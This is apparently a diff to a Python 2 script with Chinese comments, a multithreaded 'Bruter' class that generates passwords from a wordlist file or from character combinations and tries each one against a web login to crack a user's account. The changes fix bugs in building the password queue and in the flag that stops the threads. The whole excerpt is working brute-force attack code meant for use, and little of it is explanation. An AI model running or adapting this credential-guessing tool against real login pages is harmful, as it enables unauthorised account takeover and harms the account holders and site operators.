@@ -5,7 +5,7 @@
 	   如果是通过指定字符构造密码词典，不得包含.txt
 '''
 '''
-问题1：此程序待测试
+问题1：破解到密码不会停止, self.found 不起作用.!!!
 问题2：以上几个模块了解 
 问题3：类中__init__函数一定要放在第一个吗？
 问题4：构造密码字符中包含保留转字符处理方案(\n,%s)等
@@ -16,25 +16,24 @@
 import requests
 import sys
 import itertools
-
 import threading
 import time
 import Queue
 
 class Bruter(object):
-	# characters 包含组成口令的所有字符
+	# characters 包含组成口令的所有字符 或者密码字典
 	# threads 线程个数 pwd_len 为生成的测试口令的长度
 	def __init__(self,user,characters,pwd_len,threads):
 		self.user = user
 		self.characters = characters
+		self.pwd_len = pwd_len
 		# 破解成功的标志
 		self.found = False
 		self.threads = threads
 		print('构建待测试口令队列中……')
 		# 包含所有测试口令的队列
 		self.pwd_queue = Queue.Queue()
-
-		for pwd in pwd_pool:
+		for pwd in self.__pwd_pool():
 			self.pwd_queue.put(''.join(pwd))
 		self.result = None
 		print('构建成功')
@@ -42,14 +41,14 @@ class Bruter(object):
 	#构造密码字典		
 	def __pwd_pool(self):
 		# 读取现有密码字典
-		if '.txt' in characters:
+		if '.txt' in self.characters:
 			pwd_pool = []
 			with open(self.characters, 'rb') as f:
 				for i in f.readlines():
 					pwd_pool.append(i.strip())
 		# 根据规则构造密码字典
 		else:
-			pwd_pool = list(itertools.product(characters, repeat = pwd_len))
+			pwd_pool = list(itertools.product(self.characters, repeat = self.pwd_len))
 
 		return pwd_pool
 
@@ -59,11 +58,13 @@ class Bruter(object):
 			t.start()
 			print('破解线程-->%s 启动' % t.ident)
 		# 当密码标志位为False 和 密码池不为空时
-		while(not self.pwd_queue.empty() and not self.found):
+		while not self.found and not self.pwd_queue.empty():
 			sys.stdout.write('\r 进度：还剩余%s个口令 （每10ms刷新）' % self.pwd_queue.qsize())
 			sys.stdout.flush()
-			time.sleep(0.01)
+			time.sleep(0.001)
 		print('\n破解完毕')
+
+
 	
 
 	'''接着是破解子线程函数web_bruter,将它设为私有函数。循环从口令队列中获取测试口令并进行模拟登录测试。如果登录成功，将破解成功的标志属性self.found设为True以提醒其他线程停止猜解;此外，将当前测试口令保存到self.result中，并打印出破解成功的信息。'''
@@ -83,7 +84,7 @@ class Bruter(object):
 	
 	def __web_bruter(self):
 
-		while not self.pwd_queue.empty() and not self.found:
+		while not self.found and not self.pwd_queue.empty():
 			pwd_test = self.pwd_queue.get()
 			if self.__login(pwd_test):
 				self.result = pwd_test
